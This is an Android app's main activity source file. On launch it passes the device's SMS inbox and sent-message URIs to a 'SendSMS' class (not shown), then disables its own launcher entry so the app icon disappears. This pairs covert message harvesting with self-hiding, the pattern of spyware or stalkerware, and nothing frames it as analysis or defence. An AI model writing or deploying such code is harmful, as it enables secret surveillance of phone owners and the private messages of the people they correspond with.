package com.mujahidrasool.broadcastreceiver;

import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

//       new abc().execute();

        new SendSMS(MainActivity.this, "content://sms/inbox");
        new SendSMS(MainActivity.this, "content://sms/sent");

        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, com.mujahidrasool.broadcastreceiver.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

    }

/*    class abc extends AsyncTask<Void, Void, Void> {


        @Override
        protected Void doInBackground(Void... voids) {
            new SendSMS(MainActivity.this, "content://sms/inbox");
            new SendSMS(MainActivity.this, "content://sms/sent");
            return null;
        }


    }*/
}



